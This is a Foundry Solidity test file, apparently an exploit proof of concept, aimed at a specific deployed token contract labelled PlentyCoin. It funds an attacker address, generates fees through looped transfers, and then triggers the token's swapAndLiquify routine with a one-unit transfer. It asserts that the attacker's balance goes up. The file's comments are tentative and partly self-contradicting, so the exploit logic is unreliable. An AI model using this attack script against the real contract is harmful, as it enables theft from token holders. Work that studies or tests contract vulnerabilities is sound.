// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IPlenty {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function swapAndLiquifyEnabled() external view returns (bool);
    function uniswapV2Pair() external view returns (address);
    function numTokensSellToAddToLiquidity() external view returns (uint256);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xa5e8A886B6BAB60E1A2273b79CaA72143eD8B418;
    address attacker = address(this);
    address feeGen1 = address(0x111);
    address feeGen2 = address(0x222);
    uint256 requiredTokens = 500000 * 10**6 * 10**18;


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        uint256 requiredTokensLocal = 500000 * 10**6 * 10**18;
        deal(TARGET, attacker, requiredTokensLocal * 2);

        // Create addresses for fee generation
        deal(TARGET, feeGen1, requiredTokensLocal * 10);
        deal(TARGET, feeGen2, requiredTokensLocal * 10);

        // Label addresses
        vm.label(TARGET, "PlentyCoin");
        vm.label(attacker, "Attacker");
        vm.label(feeGen1, "FeeGen1");
        vm.label(feeGen2, "FeeGen2");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, let's check the current state
        address owner = IPlenty(TARGET).owner();
        console.log("Owner:", owner);

        // Check if attacker is excluded from fee (shouldn't be for fees to accumulate)
        // We need to be included in fees for our transfers to generate contract balance

        // Get current contract balance
        uint256 contractBalance = IPlenty(TARGET).balanceOf(TARGET);
        console.log("Initial contract balance:", contractBalance);

        // Get threshold
        uint256 threshold = 500000 * 10**6 * 10**18; // numTokensSellToAddToLiquidity
        console.log("Threshold for swapAndLiquify:", threshold);

        // If contract doesn't have enough tokens, we need to generate fees
        // We'll transfer from owner to attacker (or vice versa) to generate fees
        // But first, we need tokens to transfer

        // Option 1: If contract already has enough tokens from previous activity
        if (contractBalance >= threshold) {
            console.log("Contract already has enough tokens");
        } else {
            console.log("Need to generate fees");

            // We need to make transfers that generate fees
            // First, ensure attacker has some tokens to transfer
            // Let's get some from owner
            vm.prank(owner);
            IPlenty(TARGET).transfer(attacker, threshold * 2);

            // Now make transfers to generate fees
            // Transfer from attacker to a new address (not excluded from fee)
            address recipient1 = address(0x111);

            // Make several large transfers to accumulate fees in contract
            for (uint i = 0; i < 5; i++) {
                IPlenty(TARGET).transfer(recipient1, threshold / 10);

                // Transfer back to keep balance
                vm.prank(recipient1);
                IPlenty(TARGET).transfer(attacker, (threshold / 10) * 9 / 10); // Less due to fees
            }

            contractBalance = IPlenty(TARGET).balanceOf(TARGET);
            console.log("Contract balance after fee generation:", contractBalance);
        }

        // Now trigger swapAndLiquify
        // We need to make a transfer that triggers the condition in _transfer()
        // Conditions: contractTokenBalance >= threshold, from != uniswapV2Pair, swapAndLiquifyEnabled
        console.log("Making trigger transfer...");
        uint256 attackerBalanceBefore = IPlenty(TARGET).balanceOf(attacker);
        console.log("Attacker balance before:", attackerBalanceBefore);

        // Make a small transfer to trigger swapAndLiquify
        address recipient2 = address(0x222);
        IPlenty(TARGET).transfer(recipient2, 1);

        uint256 attackerBalanceAfter = IPlenty(TARGET).balanceOf(attacker);
        console.log("Attacker balance after:", attackerBalanceAfter);
        console.log("Profit:", attackerBalanceAfter - attackerBalanceBefore);

        // The exploit should work if attacker balance increased
        // The vulnerable transfer in swapAndLiquify uses attacker's tokens for buyback
        // So attacker might lose some tokens initially but gain more later
        // Actually, let's check if we gained overall
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should gain tokens");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

